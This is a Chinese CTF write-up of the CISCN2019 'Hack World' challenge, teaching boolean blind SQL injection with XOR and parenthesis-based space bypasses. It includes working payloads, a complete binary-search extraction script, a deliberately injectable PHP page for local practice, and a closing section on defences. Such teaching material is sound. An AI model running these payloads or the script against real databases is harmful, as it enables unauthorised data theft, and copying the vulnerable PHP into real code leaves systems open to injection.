---
title: "[CISCN2019 华北赛区 Day2 Web1] Hack World：空格被过滤后的布尔盲注与二分查找"
date: 2026-11-12 10:00:00
updated: 2026-11-12 10:00:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - 布尔盲注
  - 二分查找
  - 异或运算
  - 空格绕过
  - Burp Suite
  - CISCN
description: 页面只有两种回显，表名和列名还直接写在脸上。空格、and、or、union 被拦，于是用 ^ 做异或、用括号代替空格，把 flag 的每一位变成一道真假题，再用二分查找把 95 种可能压到 7 次请求。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 6
permalink: 2026/11/12/web-ctf-sql-bool-blind/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（建议先看 [SQL 注入基础](/2026/10/22/web-knowledge-sql-basics/) 和本系列前五篇）
- **考点**：布尔盲注、`^` 异或构造条件、括号替代空格、二分查找、脚本化
- **过滤情况**：空格、`and`、`or`、`union`、`order`、`limit`、`group`、`handler`、`update` 等被拦；`select`、`substr`、`ascii`、`^`、`(`、`)` 可用
- **回显**：只有两种页面 —— `Hello, glzjin wants a girlfriend.` 和 `Error Occured When Fetch Result.`
- **路线**：确认注入点 → 摸过滤 → 用 `^` 构造布尔条件 → 逐位二分 → 脚本拿 flag
- **flag**：`CTF2{82f01e38-957d-4138-88f9-427927047ee1}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：SQL 注入的基本原理、`select` / `substr` / `ascii` 的用法、Burp Intruder 或 `curl` 的基本操作、Python `requests`
- **工具**：Burp Suite（Intruder）、Python 3、`requests`。没有 Burp 也能做，文中有 `curl` 版本
- **环境**：文中的靶场地址是当时的临时环境，现在多半已经失效。文末给了一个 **PHP + MySQL 本地复现实验**，可以完整跑通本文的脚本
- 本文所有操作仅用于**授权靶场和本地环境**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`提交 1 看正常回显` → `用 1^1 / 1^0 确认异或` → `Intruder 摸黑名单` → `拼出单个字符的 payload` → `校准真假映射` → `二分查找` → `脚本跑出 flag`
{% endnote %}

## 题目：这次连表名都告诉你了

打开靶场，页面非常直接：

![Hack World 首页](01-challenge.png)

*图 1：页面顶部直接写着 `All You Want Is In Table 'flag' and the column is 'flag'`*

页面上的两句话是：

> All You Want Is In Table 'flag' and the column is 'flag'
>
> Now, just give the id of passage

翻译过来就是：**flag 在 `flag` 表的 `flag` 列里，你只需要给我一个 `id`。**

这相当于把 `information_schema` 爆库爆表那一步直接省掉了。正常的流程本来是“爆库 → 爆表 → 爆列 → 拖数据”，这题只需要最后一步，但代价是——**页面不会把数据回显给你**。

所以这是一道典型的**盲注**题：你能问数据库问题，但只能得到“是/否”两个答案，数据本身不会出现在页面上。

## 第一步：确认注入点和回显类型

先提交一个正常的 `id`：

```text
id=1
```

页面返回：

```text
Hello, glzjin wants a girlfriend.
```

再试一个异或表达式：

```text
id=1^1
```

![id=1^1 的回显](03-xor-test.png)

*图 2：`id=1^1` 返回 `Error Occured When Fetch Result.`，HTTP 状态码仍然是 200*

再试：

```text
id=1^0
```

页面又变回 `Hello, glzjin wants a girlfriend.`

把三个结果放在一起：

| 输入 | `id` 的值 | 页面 | 含义 |
| --- | --- | --- | --- |
| `1` | 1 | `Hello, glzjin wants a girlfriend.` | 查到了 id=1 的行 |
| `1^0` | 1 | 同上 | 异或结果仍是 1 |
| `1^1` | 0 | `Error Occured When Fetch Result.` | id=0 查不到行 |

这一步至少说明四件事：

1. **注入点是数字型**。`1^1` 没有引号，却被当成表达式计算了，说明 `id` 被直接拼进了 SQL，而且没有加引号；
2. **`^` 没有被过滤**。这一点是后面所有操作的基础；
3. **页面只有两种状态**，没有数据回显——只能做布尔盲注；
4. **HTTP 状态码没用**。两种页面都返回 `200`，必须看响应正文。

{% note warning %}
**`Error Occured When Fetch Result.` 不一定等于“SQL 报错”。**

在这题里，后端大概是先执行 `SELECT * FROM passage WHERE id=$id`，再判断有没有取到行：

- `id=0` 时查询本身没报错，只是**没有行**，取结果失败，于是打印这句话；
- 如果 SQL 语法真的错了，查询返回 `false`，走到同一个 `else` 分支，也可能打印同一句话。

也就是说，**“Error 页面”可能是条件为真，也可能是 payload 写错了**。所以后面每换一种写法，都要先用已知的真/假条件校准一次，不能看到 Error 就默认“注入成功”。
{% endnote %}

### 为什么 `^` 能替代 `and`

`^` 是 MySQL 的**按位异或**运算符：

| 左操作数 | 右操作数 | 结果 |
| --- | --- | --- |
| 0 | 0 | 0 |
| 0 | 1 | 1 |
| 1 | 0 | 1 |
| 1 | 1 | 0 |

它有两个很适合盲注的性质：

- **返回 0 或 1**，可以直接当布尔值用；
- **`1 ^ x` 会把 `x` 取反**：`x=1` 得 0，`x=0` 得 1。

而 `and`、`or` 这两个单词在这题被黑名单拦了，`^` 不是关键字，恰好活了下来。后面我们会利用 `1 ^ 条件` 把“条件真假”翻译成“id 是 0 还是 1”。

## 第二步：用 Intruder 摸清黑名单

盲注最怕的不是“猜不到”，而是“payload 里某个词被过滤了，脚本却以为条件为假”。所以先把黑名单摸清楚。

**1. 把请求送进 Intruder**

抓一个 `POST /index.php` 的请求，右键 → `Send to Intruder`（`Ctrl+I`）。

**2. 设置 payload 位置**

`Positions` → `Clear §` → 选中 `id` 的值 → `Add §`：

```http
POST /index.php HTTP/1.1
Host: <靶场地址>
Content-Type: application/x-www-form-urlencoded

id=§1§
```

**3. 准备字典**

把常见的 SQL 关键字、符号和函数名放进去：

```text
select
substr
ascii
union
and
or
order
limit
group
handler
update
updatexml
sleep
^
(
)
;
#
"
&
|
```

**4. 按 Length 排序看结果**

![Intruder 结果](02-intruder.png)

*图 3：每个 token 单独作为 `id` 发一次，响应长度分成 525 和 535 两档*

整理一下截图里的结果：

| 落在 525 一档 | 落在 535 一档 |
| --- | --- |
| `select`、`substr`、`^`、`/**/`、`;` | `union`、`and`、`or`、`order`、`limit`、`group`、`handler`、`update` |

结合后面能跑通的 payload，可以得出这些结论：

1. **`select`、`substr`、`ascii` 能用**：盲注需要的能力都还在；
2. **`and`、`or` 被拦**：不能用常规的布尔表达式，得换 `^`；
3. **`union` 被拦**：UNION 注入直接出局；
4. **`order`、`limit`、`group` 被拦**：`group_concat`、`limit 0,1` 这类翻页技巧都别想了；
5. **`update` 被拦**：`updatexml` 里含有 `update`，报错注入大概率也打不出来；
6. **空格不能出现**：这是最关键的一条，下面单独说。

{% note warning %}
**单独发一个关键字，结果只能当“初筛”。**

`id=and`、`id=union` 这种请求本身就不是合法 SQL，页面同样会走 Error 分支。所以“535 一档”里混着两种东西：**被黑名单拦掉的**，和**自己语法就不对的**。

真正的确认方式是拿一个完整的、能正常执行的 payload 去试。比如 `1^1` 返回 Error、`1^0` 返回 Hello，说明 `^` 能用；把 `substr` 换成 `substring` 后结果不变，说明 `substr` 这一族都能用。**Intruder 负责缩小范围，完整 payload 负责下结论。**
{% endnote %}

### 空格被拦，payload 怎么写

平时写 SQL 习惯用空格分隔 token：

```sql
select flag from flag
substr((select flag from flag), 1, 1)
```

但这题空格在黑名单里，上面两条都发不出去。绕过的办法是**用括号代替空格**：

```sql
select(flag)from(flag)
substr((select(flag)from(flag)),1,1)
```

MySQL 允许在关键字后面直接跟括号，括号本身起到了分隔 token 的作用：

| 平时写法 | 本题写法 |
| --- | --- |
| `select flag from flag` | `select(flag)from(flag)` |
| `select database()` | `select(database())` |
| `from information_schema.tables` | `from(information_schema.tables)` |
| `where table_schema='geek'` | `where(table_schema='geek')` |

这不是“SQL 支持省略空格”那么简单，而是**括号把表达式包起来之后，词法上已经不需要空格了**。`select(flag)` 等价于 `select (flag)`，`from(flag)` 等价于 `from (flag)`。

{% note info %}
**为什么不干脆用 `/**/`？**

`/**/` 是 SQL 里最常见的“空格替代品”，Intruder 里它也确实落在 525 一档。但这题只用括号就够了，payload 更短、更好读。

另外，`--` 注释在 MySQL 里**后面必须跟一个空格**，空格被拦时通常用不了；`#` 不需要空格，但这题是数字型注入，不需要注释掉任何尾部内容，所以也用不上。
{% endnote %}

{% note warning %}
**别把 `||` 当成稳赚的 `or`。**

Intruder 里 `||` 落在 525 一档，但这只能说明这两个字符本身没被关键字规则拦掉，不能说明它在这道题里等价于逻辑或。

MySQL 的 `||` 行为受 `sql_mode` 影响：

- 默认情况下，`||` 是逻辑或；
- 开启 `PIPES_AS_CONCAT` 后，`||` 变成字符串拼接。

所以看到 `||` 没被拦，也要用完整表达式验证一次再用。本题用 `^` 更稳，因为它不依赖 `sql_mode`，语义固定。
{% endnote %}

{% note success %}
**没有 Burp 也能摸**：用 `curl` 循环，看 `size_download`。

```bash
for w in select substr ascii union and or order limit group handler update; do
  printf '%-12s ' "$w"
  curl -s -o /dev/null -w '%{size_download}\n' \
    -X POST 'http://<靶场地址>/index.php' \
    --data-urlencode "id=$w"
done
```

`--data-urlencode` 会把 `^`、`(`、`)` 这些字符正确编码。看到 525 和 535 两档，就说明探测方式和 Intruder 一致。
{% endnote %}

## 第三步：拼出第一个布尔条件

现在目标很明确：让页面回答“flag 的第 1 个字符是不是 `C`”。

flag 的格式是 `CTF2{...}`，第 1 位一定是 `C`，`C` 的 ASCII 码是 67。构造：

```text
1^(ascii(substr((select(flag)from(flag)),1,1))=67)
```

提交后页面返回 Error：

![完整 payload 测试](04-payload-test.png)

*图 4：`id=1^(ascii(substr((select(flag)from(flag)),1,1))=67)`，返回 `Error Occured When Fetch Result.`*

为什么“条件是对的”，页面反而报错？把表达式拆开看：

| 片段 | 作用 |
| --- | --- |
| `1` | 外层异或的左操作数 |
| `^` | 按位异或 |
| `ascii(...)` | 取字符的 ASCII 码 |
| `substr(...,1,1)` | 从第 1 位开始取 1 个字符 |
| `(select(flag)from(flag))` | 标量子查询，取出 flag 字符串 |
| `=67` | 判断是不是 `C` |
| 最外层括号 | 保证先算比较，再算异或 |

计算顺序是：

```text
第 1 位是 'C'
  → ascii('C') = 67
  → 67 = 67，条件为真，得 1
  → 1 ^ 1 = 0
  → WHERE id=0，查不到行
  → Error Occured When Fetch Result.
```

反过来，如果猜成 `=68`，条件为假，得 0，`1^0=1`，查得到 id=1 的行，页面就是 `Hello, glzjin wants a girlfriend.`

所以这题的**真假映射是反的**：

| 条件 | 括号里的值 | `1^值` | 查询结果 | 页面 |
| --- | --- | --- | --- | --- |
| 真 | 1 | 0 | 查不到 | `Error Occured When Fetch Result.` |
| 假 | 0 | 1 | 查到 id=1 | `Hello, glzjin wants a girlfriend.` |

{% note warning %}
**写脚本前一定要先校准这一张表。**

不同题目的“真页面”和“假页面”可能正好相反，也可能长得完全不一样。最稳妥的做法是固定发两个请求：

```text
1^1   → 应该得到“真”页面
1^0   → 应该得到“假”页面
```

如果结果和你预期的不一致，**改脚本里的判断，不要改 payload 的数学逻辑**。真假写反是盲注脚本最常见、也最难发现的 bug：脚本不会报错，只会从头到尾输出一串错位的字符。
{% endnote %}

### 为什么比较要套一层括号

MySQL 的运算符优先级里，`^` 比比较运算符 `=` 更高。如果写成：

```sql
1^ascii(substr((select(flag)from(flag)),1,1))=67
```

它会先算 `1^ascii(...)`，再拿结果和 67 比较，语义完全变了。所以必须写成：

```sql
1^(ascii(substr((select(flag)from(flag)),1,1))=67)
```

用括号把“比较”包起来，明确告诉数据库：**先得到 0/1，再和 1 异或。**

{% note info %}
**为什么用 `ascii()` 比较数字，而不是直接比较字符？**

`ascii()` 返回 0–255 的整数，比较结果确定、不受排序规则（collation）影响，也方便做二分查找。直接写 `substr(...)='C'` 当然也能用，但没法一次问“比 `M` 大还是小”，只能一个字符一个字符试。

`ord()` 是 `ascii()` 的同义函数；`substring()`、`mid()` 是 `substr()` 的同义函数，被封的时候可以互相替换。
{% endnote %}

## 第四步：从逐位猜到二分查找

有了“猜一位字符”的能力，接下来要解决的是“怎么猜得快”。

### 最笨的办法：从 32 试到 126

可打印 ASCII 的范围是 32（空格）到 126（`~`），一共 95 个值。对每一位：

```text
试 32、33、34 ... 直到页面说“相等”
```

最坏情况一位要 95 次请求，42 位的 flag 就是 **3990 次**。太慢，而且容易触发限速。

### 二分查找：7 次一位

把问题从“是不是 67”换成“**是不是大于 mid**”：

```sql
1^(ascii(substr((select(flag)from(flag)),POS,1))>MID)
```

每次请求都能排除一半：

```text
32 ─────────────── 126
        mid
  小于等于 mid  |  大于 mid
```

95 个值，`ceil(log2(95)) = 7` 次就能确定一位。42 位大约 **294 次**请求，比线性扫描少一个数量级。

以第 1 位 `C`（67）为例：

| 轮次 | `lo` | `hi` | `mid` | 问：字符 > mid？ | 结果 | 新区间 |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | 32 | 126 | 79 | 67 > 79 | 假 | `hi=78` |
| 2 | 32 | 78 | 55 | 67 > 55 | 真 | `lo=56` |
| 3 | 56 | 78 | 67 | 67 > 67 | 假 | `hi=66` |
| 4 | 56 | 66 | 61 | 67 > 61 | 真 | `lo=62` |
| 5 | 62 | 66 | 64 | 67 > 64 | 真 | `lo=65` |
| 6 | 65 | 66 | 65 | 67 > 65 | 真 | `lo=66` |
| 7 | 66 | 66 | 66 | 67 > 66 | 真 | `lo=67` |

循环结束时 `lo == hi + 1`，`lo` 就是答案 67。

映射到脚本里：

```python
if 条件为真:      # 字符 > mid
    lo = mid + 1
else:             # 字符 <= mid
    hi = mid - 1
# 最后 chr(lo) 就是这一位字符
```

注意这里的 `条件为真` 对应的是 **Error 页面**。如果直接写 `if "Hello" in response.text: lo = mid + 1`，就把方向写反了。

## 第五步：写脚本

把上面的逻辑串起来。脚本做了四件事：

1. 用 `1^1` / `1^0` 校准真假页面；
2. 用 `>` 做二分查找；
3. 请求失败时重试，避免网络抖动把某一位猜错；
4. 遇到 `}` 就停，避免越界后一直输出空格。

```python
import sys
import time

import requests

# 换成你的靶场地址；本地复现时改成 http://127.0.0.1/index.php
URL = "http://127.0.0.1/index.php"

MAX_POS = 100
TRUE_TEXT = "Error Occured When Fetch Result."
FALSE_TEXT = "Hello, glzjin wants a girlfriend."

session = requests.Session()
session.headers.update({"Content-Type": "application/x-www-form-urlencoded"})


def ask(payload, retries=3):
    """发送 payload，返回 True（条件为真）或 False（条件为假）。"""
    for attempt in range(retries):
        try:
            response = session.post(URL, data={"id": payload}, timeout=5)
            response.raise_for_status()

            if TRUE_TEXT in response.text:
                return True
            if FALSE_TEXT in response.text:
                return False

            raise ValueError("响应里既没有真页面，也没有假页面")
        except Exception as exc:
            if attempt == retries - 1:
                raise
            print(f"[!] 请求失败，1 秒后重试：{exc}", file=sys.stderr)
            time.sleep(1)


def calibrate():
    """跑循环前先确认真假映射，防止脚本方向写反。"""
    assert ask("1^1") is True, "校准失败：1^1 应该是真页面"
    assert ask("1^0") is False, "校准失败：1^0 应该是假页面"
    print("[+] 真假映射校准通过：Error = 真，Hello = 假")


def guess_char(pos, lo=32, hi=126):
    """二分查找第 pos 位字符的 ASCII 码。"""
    while lo <= hi:
        mid = (lo + hi) // 2
        payload = (
            "1^(ascii(substr((select(flag)from(flag)),"
            f"{pos},1))>{mid})"
        )

        if ask(payload):
            lo = mid + 1      # 当前字符 > mid
        else:
            hi = mid - 1      # 当前字符 <= mid

    if lo > 126:
        raise ValueError(f"第 {pos} 位超出可打印 ASCII 范围，flag 可能已经结束")
    return chr(lo)


def main():
    calibrate()

    flag = ""
    for pos in range(1, MAX_POS + 1):
        char = guess_char(pos)
        flag += char
        print(f"[+] 第 {pos:02d} 位：{char!r}  ->  {flag}")

        # flag 以 } 结尾；再检查前缀，避免中途误判
        if char == "}" and flag.startswith("CTF2{"):
            break

    print(f"\n[+] flag = {flag}")


if __name__ == "__main__":
    main()
```

跑起来就是图 5 的样子：

![脚本运行结果](05-script-result.png)

*图 5：每秒输出一位，最后拼接出完整 flag*

```text
CTF2{82f01e38-957d-4138-88f9-427927047ee1}
```

{% note info %}
**为什么 payload 要拆成两段字符串拼起来？**

只是为了代码好读，实际发出去的仍然是一条没有空格的 payload：

```text
1^(ascii(substr((select(flag)from(flag)),7,1))>79)
```

`requests` 会自动把 `^`、`(`、`)`、`>` 做 URL 编码，不需要手动处理。真正要保证的是：**payload 字符串里不能混进空格。**
{% endnote %}

### 逐行解释几个容易出错的点

| 代码 | 为什么这么写 |
| --- | --- |
| `data={"id": payload}` | 题目是 `POST` 表单，参数名是 `id`；用 `data=` 而不是 `json=` |
| `TRUE_TEXT = "Error..."` | 这题“条件为真”对应 Error 页面，映射是反的 |
| `response.raise_for_status()` | 5xx / 429 时抛异常进入重试，避免把错误页当成“假” |
| `if attempt == retries - 1: raise` | 重试用尽就停止，不要无限循环 |
| `if lo > 126: raise` | `chr(127)` 是 `DEL`，不是 flag 里的字符；越界说明 flag 已经结束 |
| `char == "}" and flag.startswith("CTF2{")` | 用已知前缀 + 右花括号双重确认，避免数据里恰好出现 `}` |
| `MAX_POS = 100` | 兜底上限，防止 `ask()` 一直返回假导致死循环 |

## 为什么选布尔盲注：几种注入方式对比

同一道题，能用和不能用的手段可以列一张表：

| 方式 | 本题 | 原因 |
| --- | --- | --- |
| UNION 注入 | ✗ | `union` 被拦；而且页面没有回显位，就算注进去也看不到数据 |
| 报错注入 | ✗ | `update` 被拦，`updatexml` 大概率不可用；页面也不显示原始 SQL 报错 |
| 时间盲注 | △ | 理论上能做，但每个字符要等几秒，42 位太慢；本题有稳定的布尔回显，没必要 |
| 布尔盲注 | ✓ | 页面有稳定两种状态，`select` / `substr` / `ascii` / `^` 都能用 |
| 堆叠注入 | ✗ | 需要 `;` 和多语句执行权限；本题也没有回显，注入 `insert` 看不到结果 |

这道题的“提示”其实已经把最难的元数据枚举省掉了。如果没有 `Table 'flag' and column 'flag'` 这句话，盲注也能爆库爆表，只是要额外解决两个问题：

- `group` 被拦，`group_concat` 用不了；
- `limit` 被拦，不能一行一行翻。

这时只能靠 `where` 把结果钉成单行，再对单行做 `substr`，请求数会成倍增加。**题目给提示不是降低难度，而是把注意力集中到“盲注 + 脚本”本身。**

## 知识点补充

### 1. 布尔盲注的通用四步

不管题目怎么变，布尔盲注的骨架都是这四步：

1. **找两种可区分的响应**：长度不同、文案不同、状态码不同都行；
2. **找一个把数据变成真假的表达式**：`ascii(substr(...))>N`、`length(...)>N`、`regexp`、`like` 都可以；
3. **把表达式接到注入点**：数字型直接接，字符型先闭合引号；
4. **用二分或逐位把字符猜出来**：脚本化，别手点。

这道题只是把第 2 步换成了 `^` 异或，把第 4 步换成了二分查找。

### 2. 常用字符串函数

| 函数 | 作用 | 备注 |
| --- | --- | --- |
| `substr(str, pos, len)` | 从 `pos` 开始取 `len` 个字符 | `pos` 从 **1** 开始；`substring`、`mid` 是同义词 |
| `ascii(str)` | 返回首字符的 ASCII 码 | `ord()` 同义；空字符串返回 0 |
| `length(str)` | 字符串长度 | 可以先二分出 flag 长度，再逐位取 |
| `hex(str)` | 转十六进制字符串 | 一次能看两位，但比较时还要再处理 |
| `char(n)` | 数字转字符 | 构造测试数据时有用 |

这题用 `substr` + `ascii` 就够了。`length` 没有被验证过是否可用，但即使可用，也只是省掉“什么时候停”的判断，不影响主流程。

### 3. `substr` 越界会怎样

这是一个很容易被忽略的坑：

```sql
substr('abc', 10, 1)   -- 返回空字符串 ''
ascii('')              -- 返回 0
```

如果 flag 已经结束，继续取第 43 位，`ascii('')` 是 0，条件 `0 > mid` 永远为假，二分查找会一路把 `hi` 压到 31，最后返回 `chr(32)`，也就是一个空格。

所以脚本不能只靠“二分查找自然结束”，必须有明确的终止条件：

- 遇到 `}` 且前缀是 `CTF2{` 就停；
- 或者先用 `length()` 拿到准确长度，再循环固定次数。

### 4. 位运算与真假

| 运算 | 符号 | 用途 |
| --- | --- | --- |
| 按位异或 | `^` | `1^x` 取反，最适合构造布尔开关 |
| 按位与 | `&` | 取某一位，`x&1` 判断奇偶 |
| 按位或 | `\|` | 置位 |
| 按位取反 | `~` | 注意 MySQL 里是 64 位补码，结果可能很大 |

`^` 的好处是**不依赖关键字、语义固定、结果只有 0/1**。`&&`、`||` 虽然也是逻辑运算，但它们受黑名单和 `sql_mode` 影响，稳定性不如 `^`。

### 5. 运算符优先级

MySQL 里和本题相关的大致顺序（从高到低）：

```text
函数调用  >
^         >
= > <     >
NOT       >
AND &&    >
XOR       >
OR ||     >
```

所以：

```sql
1^1=0      -- 解析成 (1^1)=0，结果是真
1^(1=0)    -- 先算比较，1^0，结果是 1
```

两句话意思完全不同。**只要 `^` 和比较运算符出现在同一个表达式里，就给比较套括号。**

### 6. 请求预算

| 方法 | 每字符请求数 | 42 位总计（约） |
| --- | --- | --- |
| 线性扫描 32–126 | 最多 95 | 3990 |
| 二分查找 | 7 | 294 |
| 已知字符集（如 `[0-9a-f-{}]`） | 5 | 210 |

二分查找在“不知道字符集”的前提下已经接近最优。想再快，只能：

- 利用已知前缀 `CTF2{` 跳过前 5 位；
- 把字符集缩小到 flag 常见字符，但一旦猜错范围就会得到错误结果；
- 多线程并发跑不同位置，但要注意目标站的限速。

{% note warning %}
**并发不是越多越好。**

盲注本质上是**大量请求**，很多靶场和真实站点都有速率限制。并发太高会出现超时、429、连接重置，脚本会把失败请求误判成“假”，导致整串字符错位。稳妥的做法是：单线程 + 重试 + 每字符打印进度，确认稳定后再考虑小幅并发。
{% endnote %}

### 7. 进阶：还有哪些更快的思路

- **按位取**：`(ascii(...)>>n)&1`，固定 7 次问完一个字节，思路和二分一样，但 `&` 可能被拦；
- **`hex()` 一次取两位**：把字符转成两位十六进制，分别猜高半字节和低半字节，适合 `&`、`>>` 都被拦的场景；
- **`regexp` / `like` 前缀匹配**：`(select(flag)from(flag))regexp('^CTF2\\{a')`，一次排除一大类，但构造和调试更麻烦；
- **`length()` 先定长**：少一次“什么时候停”的猜测，适合 flag 很长的情况。

这些方法的核心都一样：**把“读数据”变成“回答是/否”，再用信息量更大的问法减少请求数。**

## 本地复现实验（PHP + MySQL）

在线靶场会失效，但这道题的过滤和盲注逻辑可以在本地完整复现。需要 PHP + MySQL（XAMPP、phpstudy、Docker 都行）。

**1. 建库建表**

```sql
CREATE DATABASE IF NOT EXISTS hackworld CHARACTER SET utf8mb4;
USE hackworld;

CREATE TABLE passage (
  id INT PRIMARY KEY,
  content VARCHAR(255)
);

CREATE TABLE flag (
  flag VARCHAR(128)
);

INSERT INTO passage VALUES (1, 'hello'), (2, 'world');
INSERT INTO flag VALUES ('CTF2{local_bool_blind_demo}');
```

**2. 写一个“有漏洞”的 `index.php`**

```php
<?php
error_reporting(0);

$id = $_POST['id'] ?? '';

// 模拟题目的黑名单：空格和这些关键字都不能出现
if (preg_match('/\s|and|or|union|order|limit|group|handler|update/i', $id)) {
    die('blacklisted');
}

$conn = new mysqli('127.0.0.1', 'root', 'your_password', 'hackworld');
$sql = "SELECT * FROM passage WHERE id=$id";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    echo "Hello, glzjin wants a girlfriend.";
} else {
    echo "Error Occured When Fetch Result.";
}
```

**3. 验证真假映射**

```text
POST id=1     → Hello, glzjin wants a girlfriend.
POST id=1^1   → Error Occured When Fetch Result.
POST id=1^0   → Hello, glzjin wants a girlfriend.
POST id=1 ^ 1 → blacklisted
```

**4. 跑本文的脚本**

把脚本里的 `URL` 改成 `http://127.0.0.1/index.php`，运行后应该输出：

```text
CTF2{local_bool_blind_demo}
```

这个实验的关键是 `error_reporting(0)` 和“查询失败也走 Error 分支”。它完整复现了本题最容易踩的坑：**你看到的 Error 可能是条件为真，也可能是 payload 写错**，所以校准步骤不能省。

## 新手常见问题

{% note info %}
**Q1：页面显示 Error，为什么你说条件为真？**

因为这题的条件被包在 `1^(...)` 里。条件为真时括号里是 1，`1^1=0`，`WHERE id=0` 查不到行，页面打印 `Error Occured When Fetch Result.`；条件为假时括号里是 0，`1^0=1`，查到 id=1 的行，页面打印 `Hello...`。真假是反的，写脚本前必须用 `1^1` / `1^0` 校准。
{% endnote %}

{% note info %}
**Q2：为什么不能用 `and` / `or`，`^` 为什么可以？**

`and`、`or` 是黑名单里的关键字，payload 里出现就被拦。`^` 是按位异或运算符，不是关键字，而且结果只有 0/1，正好可以当布尔值用；`1^x` 还能把真假取反，非常适合接到数字型注入点上。
{% endnote %}

{% note info %}
**Q3：payload 里为什么一个空格都没有？**

空格在黑名单里。MySQL 的词法分析在关键字后遇到 `(` 时，本来就不需要空格来分隔 token，所以 `select(flag)from(flag)`、`where(table_schema='x')` 都能正常解析。括号既是函数调用/分组语法，也顺便充当了分隔符。
{% endnote %}

{% note info %}
**Q4：`1^(ascii(...)=67)` 为什么不能写成 `1^ascii(...)=67`？**

MySQL 里 `^` 的优先级高于 `=`。不加括号会先算 `1^ascii(...)`，再拿结果和 67 比较，语义完全变了。必须用括号明确“先比较，得到 0/1，再异或”。
{% endnote %}

{% note info %}
**Q5：二分查找为什么从 32 到 126？**

32 是空格，126 是 `~`，这是可打印 ASCII 的范围。flag 里可能出现 `{`、`}`、`-`、数字和字母，都在这个区间内。如果字符可能包含换行、制表符或非 ASCII 字符，这个范围就不够，需要先确认字符集。
{% endnote %}

{% note info %}
**Q6：脚本把真假写反了会怎样？**

不会报错，只会从头到尾输出错位的字符。因为每一轮二分的方向都反了，`lo` 会收敛到错误的边界。典型现象是输出一堆 `~`、空格或固定字符。解决办法不是改 payload，而是回到 `1^1` / `1^0` 重新校准映射。
{% endnote %}

{% note info %}
**Q7：`select(flag)from(flag)` 为什么能执行？**

`select(flag)` 等价于 `select (flag)`，`from(flag)` 等价于 `from (flag)`。括号把标识符包起来，词法上已经能和前一个关键字分开，所以不需要空格。注意这招不是万能的：有些位置仍然需要真正的分隔符，这时才考虑 `/**/` 或换行符。
{% endnote %}

{% note info %}
**Q8：怎么知道 flag 什么时候结束？**

最可靠的是遇到 `}` 且前缀符合预期就停。不能只依赖 `substr` 越界：越界会返回空字符串，`ascii('')` 是 0，二分查找会把它当成“字符是 32”，继续输出空格。也可以先用 `length()` 拿到长度（如果它没被拦），再固定循环次数。
{% endnote %}

{% note info %}
**Q9：请求超时、被限速怎么办？**

先降低并发，单线程跑；给 `requests` 加 `timeout` 和有限次重试；重试仍然失败就暂停脚本，不要吞掉异常继续跑。盲注脚本最怕“失败请求被当成假”，那会导致整串字符错位，而且很难从输出里发现。
{% endnote %}

{% note info %}
**Q10：题目没给表名和列名怎么办？**

用同一个布尔通道去爆 `information_schema`。不过这题 `group` 和 `limit` 都被拦，`group_concat` 和翻页都用不了，只能靠 `where` 把结果钉成单行，再对单行做 `substr`，请求数会明显增加。题目把表名和列名直接写出来，其实是在帮你省这一步。
{% endnote %}

{% note info %}
**Q11：能不能直接用 `sqlmap`？**

可以，`sqlmap -r request.txt --technique=B --batch` 就是布尔盲注模式。但这题有空格过滤，sqlmap 的默认 payload 可能被拦，需要配 tamper（如 `space2comment`）或手工指定 `--tamper`。更重要的是：**先手写一遍脚本，才知道 sqlmap 在做什么、为什么有时候会猜错。**
{% endnote %}

{% note info %}
**Q12：为什么响应状态码一直是 200？**

因为后端对“查不到”和“SQL 报错”都做了统一处理，仍然返回正常 HTML，只是正文不同。盲注脚本不能靠状态码判断，必须匹配响应正文里的特征字符串。这也是真实站点常见的形态：错误被吞掉，但页面内容仍然泄露了布尔信息。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 / payload | 预期结果 |
| --- | --- | --- | --- |
| 1 | 找正常回显 | `id=1` | `Hello, glzjin wants a girlfriend.` |
| 2 | 确认异或可用 | `id=1^1` / `id=1^0` | Error / Hello |
| 3 | 摸黑名单 | Burp Intruder 或 `curl` 循环 | 525 / 535 两档 |
| 4 | 确认空格被拦 | `id=1^1` 能过，`id=1 ^ 1` 不能过 | 后者被拦 |
| 5 | 拼单个条件 | `1^(ascii(substr((select(flag)from(flag)),1,1))=67)` | Error（条件为真） |
| 6 | 校准映射 | `1^1` 真、`1^0` 假 | 与脚本判断一致 |
| 7 | 二分猜字符 | `1^(ascii(substr((select(flag)from(flag)),POS,1))>MID)` | 每字符 7 次请求 |
| 8 | 脚本循环 | 见正文脚本 | `CTF2{...}` |

## 顺手聊聊怎么防

盲注能成立，靠的是两件事：**输入能进入 SQL 语法**，以及**页面会泄露“真/假”的差异**。防护也要从这两头下手：

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **预编译语句（参数化查询）** | 让输入永远是数据，不进入 SQL 语法，根除注入 |
| ★★★ | **数字型参数强制转型** | `$id = intval($_POST['id']);`，本题这种数字型注入直接失效 |
| ★★☆ | **统一错误与空结果页面** | 查不到、报错、正常无数据都返回同样的响应，盲注失去信道 |
| ★★☆ | **限速与异常请求监控** | 一个 IP 每秒几十次同参数请求，是很明显的盲注特征 |
| ★☆☆ | **WAF / 关键字黑名单** | 只能提高门槛。本题就是黑名单，换个运算符、换个函数就绕过去了 |
| ★☆☆ | **最小权限数据库账号** | 即使注入成功，也读不到敏感库表 |

预编译的写法：

```php
$stmt = $pdo->prepare('SELECT * FROM passage WHERE id = ?');
$stmt->execute([(int) $_POST['id']]);
$row = $stmt->fetch();
```

{% note success %}
**一条原则**：黑名单是在“猜攻击者会写什么”，永远猜不完。真正的解法是让输入**没有机会变成 SQL 语法**；退一步，至少让“真”和“假”在响应上不可区分，并把请求频率压下来。
{% endnote %}

## 小结

这道题把布尔盲注的几个关键点串成了一条完整的链：

- **先判断回显类型**：页面只有两种状态、HTTP 状态码都是 200，说明只能做布尔盲注；
- **`^` 是本题的钥匙**：`and` / `or` 被拦，`^` 既能当布尔值，又能用 `1^x` 取反；
- **括号可以替代空格**：`select(flag)from(flag)` 不是玄学，而是词法上的等价写法；
- **真假映射必须先校准**：条件为真反而返回 Error，这是 `1^1=0` 的直接结果，也是脚本最容易写反的地方；
- **二分查找把 95 次压到 7 次**：盲注不是“慢慢猜”，而是“用信息量最大的问法猜”；
